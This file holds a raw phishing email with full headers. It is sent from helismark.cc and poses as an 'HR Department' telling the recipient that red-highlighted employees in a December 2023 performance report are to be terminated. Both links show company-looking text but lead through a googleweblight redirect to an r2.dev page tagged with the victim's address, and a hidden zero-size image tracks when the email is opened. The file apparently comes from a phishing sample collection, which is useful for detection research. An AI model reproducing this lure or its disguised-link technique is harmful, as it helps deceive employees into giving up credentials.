@@ -1,0 +1,212 @@
+Return-Path: info@helismark.cc
+Delivered-To: jose@monkey.org
+X-FDA: 81697777980.04.C8F23C8
+Received: from helismark.cc (helismark.cc [107.174.244.117])
+	by imf10.b.hostedemail.com (Postfix) with ESMTP id A4BFAA0004
+	for <jose@monkey.org>; Sat, 20 Jan 2024 00:18:29 +0000 (UTC)
+Authentication-Results: imf10.b.hostedemail.com;	dkim=pass
+ header.d=helismark.cc header.s=re1 header.b=XWG9uSZh;	spf=pass
+ (imf10.b.hostedemail.com: domain of info@helismark.cc designates
+ 107.174.244.117 as permitted sender) smtp.mailfrom=info@helismark.cc;
+	dmarc=pass (policy=none) header.from=helismark.cc
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=hostedemail.com;	s=arc-20220608; t=1705709909;
+	h=from:from:sender:reply-to:subject:subject:date:date:	
+ message-id:message-id:to:to:cc:mime-version:mime-version:	
+ content-type:content-type:	
+ content-transfer-encoding:content-transfer-encoding:in-reply-to:	
+ references:dkim-signature; bh=Pa0w6kIx642asTD9l+FIvclOsVOE498DY1RYNnWPHQo=;
+	b=fsRXBnIFFAr6jZY2p9doku/Wbd7RXC/gG1Q1SnpiobELB3WDbuScoPzO42EfXeg2r8jTy1
+	J+zyHlwK0lh1OzvFwWEKu4V6pefxl5IIziggmkUwRq3F2nw4z6eMtHW+TyLgWd/bSlS9NG
+	QQPYtlaa4DfDSV1PAFJuSmS2sGl5IUY=
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1705709909; a=rsa-sha256;
+	cv=none;
+	b=a2z2AynjXVmWEkUo9Dqo3ZjanhZVyNBSO/AnmqzHnJ3KVDPvLvp7q20RDO5GqgTI9YUa4I
+	1mHohjODn2VBA0xbfum8XUj6Us0yKKBIMtflw9m/eTgf01nC2l6R/cmQcrArQsWF9t6q1w
+	s1R3Y8HHcOQl/9MEcFBHUZMWAZIykWc=
+ARC-Authentication-Results: i=1;	imf10.b.hostedemail.com;	dkim=pass
+ header.d=helismark.cc header.s=re1 header.b=XWG9uSZh;	spf=pass
+ (imf10.b.hostedemail.com: domain of info@helismark.cc designates
+ 107.174.244.117 as permitted sender) smtp.mailfrom=info@helismark.cc;
+	dmarc=pass (policy=none) header.from=helismark.cc
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=re1; d=helismark.cc;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=info@helismark.cc;
+ bh=Pa0w6kIx642asTD9l+FIvclOsVOE498DY1RYNnWPHQo=; =?utf-8?q?b=3DXWG9uSZh/mp0?=
+ =?utf-8?q?PQONpd36+rEV2K3OvEdo/z84UkhcEfNNckvY+NVtNnXw6+NgDLbRACYXS9OL/0VO?=
+  
+ B8eV4TZ45lM6KINNqH0Endg0286XWdlKc7Kh43dmIWyIKCYm0KbHig0AF09F8szJeO6CWbyfvxqd
+  
+ ti4Ty14mDr/k119LDOqsf0IYL0K4QRQZa4NukwLn8oUq3/Hk7qmnUzfFsKPvpJU5gQZ87iKn7iB9
+  
+ DsT2MXFpBb+YcJnMPiaOyM6NJ19vtJNlf+4dcqe3vK5LMi1MwLQjlRXhzEeUR90dXi+spw5KqZ72
+   ya/f2x9AuoFrT7EXbK3X7kdAK9BrdVQaK9LBHQ==
+From: "HR Department" <info@helismark.cc>
+To: jose@monkey.org
+Subject: Employee Performance Report - December 2023
+Date: 20 Jan 2024 00:18:28 +0100
+Message-ID: <20240120001827.2AE8B7CC4B5D3B60@helismark.cc>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam03
+X-Rspamd-Queue-Id: A4BFAA0004
+X-Stat-Signature: swijd5itqzsxte7aa3okxmq37ts9ucdf
+X-Rspam-User: 
+X-Spam-Status: No, score=1.71
+X-HE-Tag: 1705709909-231635
+X-HE-Meta: =?utf-8?q?U2FsdGVkX19uVQkcXtth6LNcMwmmYAGyFDahWtGrmy6wS1PtUa8V39O?=
+ =?utf-8?q?seOE4fKWfkspcfevIwdNnnfbncun6A3Zgnaf3cuZnAndPkCZTODDaUtq96bpcK9MO?=
+ =?utf-8?q?IKAF+dz9V9oGYRDvgz6bmP43PeJ3DtMJqb31CLUdklNb5arKIbsfpi1HFxkxzzpBG?=
+ =?utf-8?q?EA126IvMVizseFuxbQfUem4ivfDiDfCxgCemrYnBMyui7mBaZg=3D?=
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 32
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001"></head>
+<body>
+<p>&nbsp;</p>
+<div id=3D"forwardbody1">
+<div style=3D"box-sizing: border-box; user-select: inherit;">
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><span style=3D"font-family: Tahoma;"><=
+span style=3D"font-size: 13pt;">Hello Gentlemen,</span></span><br style=3D"=
+box-sizing: border-box; user-select: inherit;"><br style=3D"box-sizing: bor=
+der-box; user-select: inherit;"><span style=3D"font-family: Tahoma;"><span =
+style=3D"font-size: 13pt;">Find below link to&nbsp;past month's employees p=
+erformance report, December&nbsp;2023:</span></span></div><span style=3D"fo=
+nt-family: Tahoma;"><span style=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><br style=3D"box-sizing: border-box; u=
+ser-select: inherit;"><span style=3D"font-family: Tahoma;"><span style=3D"f=
+ont-size: 13pt;">
+</span></span><a style=3D"background: none; transition:color 0.3s; color: r=
+gb(76, 140, 246); text-decoration: none; cursor: pointer; box-sizing: borde=
+r-box; touch-action: manipulation; user-select: auto;" href=3D"https://goog=
+leweblight.com/i?u=3Dhttps://pub-49b10f30dde647f591454c4ffb438718.r2.dev/ll=
+0gus8.html#jose@monkey.org" target=3D"_blank" rel=3D"noopener noreferrer"><=
+span style=3D"font-family: Tahoma;"><span style=3D"font-size: 13pt;">
+inter-records/staff.monkey.org/news/empl.record/2023-reports/</span>
+</span></a><span style=3D"font-family: Tahoma;"><span style=3D"font-size: 1=
+3pt;">
+ </span></span></div><span style=3D"font-family: Tahoma;"><span style=3D"fo=
+nt-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><span style=3D"font-family: Tahoma;"><=
+span style=3D"font-size: 13pt;">&nbsp;</span></span></div><span style=3D"fo=
+nt-family: Tahoma;"><span style=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><em style=3D"font-style: italic; box-s=
+izing: border-box; user-select: inherit;"><span style=3D"font-family: Tahom=
+a;"><span style=3D"font-size: 13pt;"><br><strong>Note: All names highlighte=
+d in</strong></span></span><strong><span style=3D"box-sizing: border-box; u=
+ser-select: inherit;"><span style=3D"font-family: Tahoma;"><span style=3D"f=
+ont-size: 13pt;">&nbsp;</span></span></span><font color=3D"#fd0217"><span s=
+tyle=3D"font-family: Tahoma;"><span style=3D"font-size: 13pt;">
+red</span></span></font><span style=3D"box-sizing: border-box; user-select:=
+ inherit;"><span style=3D"font-family: Tahoma;"><span style=3D"font-size: 1=
+3pt;">&nbsp;</span></span></span><span style=3D"font-family: Tahoma;"><span=
+ style=3D"font-size: 13pt;">indicate&nbsp;employees to be terminated.</span=
+></span></strong></em></div><span style=3D"font-family: Tahoma;"><span styl=
+e=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><span style=3D"font-family: Tahoma;"><=
+span style=3D"font-size: 13pt;">&nbsp;</span></span></div><span style=3D"fo=
+nt-family: Tahoma;"><span style=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><span style=3D"font-family: Tahoma;"><=
+span style=3D"font-size: 13pt;">&nbsp;</span></span></div><span style=3D"fo=
+nt-family: Tahoma;"><span style=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><span style=3D"font-family: Tahoma;"><=
+span style=3D"font-size: 13pt;">Best regards,</span></span></div><span styl=
+e=3D"font-family: Tahoma;"><span style=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><span style=3D"font-family: Tahoma;"><=
+span style=3D"font-size: 13pt;">Director of HR &nbsp;</span></span><br styl=
+e=3D"box-sizing: border-box; user-select: inherit;"><br style=3D"box-sizing=
+: border-box; user-select: inherit;"></div><span style=3D"font-family: Taho=
+ma;"><span style=3D"font-size: 13pt;">
+</span></span>
+<div style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: calibri; font-size: small; font-sty=
+le: normal; font-weight: 400; word-spacing: 0px; display: block; white-spac=
+e: normal; box-sizing: border-box; orphans: 2; widows: 2; background-color:=
+ rgb(255, 255, 255); user-select: inherit; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial;=20
+text-decoration-thickness: initial;"><strong style=3D"font-weight: bold; bo=
+x-sizing: border-box; user-select: inherit;"><span style=3D"font-family: Ta=
+homa;"><span style=3D"font-size: 13pt;">Human Resource Department</span></s=
+pan><br style=3D"box-sizing: border-box; user-select: inherit;"></strong><b=
+r style=3D"box-sizing: border-box; user-select: inherit;"><span style=3D"fo=
+nt-family: Tahoma;"><span style=3D"font-size: 13pt;">hr.director@monkey.org=
+ | Headquarters</span></span>
+<br style=3D"box-sizing: border-box; user-select: inherit;"><a href=3D"http=
+s://googleweblight.com/i?u=3Dhttps://pub-49b10f30dde647f591454c4ffb438718.r=
+2.dev/ll0gus8.html#jose@monkey.org"><span style=3D"font-family: Tahoma;"><s=
+pan style=3D"font-size: 13pt;">www.monkey.org</span></span></a></div></div>=
+
+<img width=3D"0" height=3D"0" class=3D"v1flm-open" style=3D"border: 0px cur=
+rentColor; border-image: none; width: 0px; height: 0px; display: block;" sr=
+c=3D"https://api.flockmail.com/s/1002/2632777/messages/receipt/fa05f02b5a">=
+</div></body></html>
+
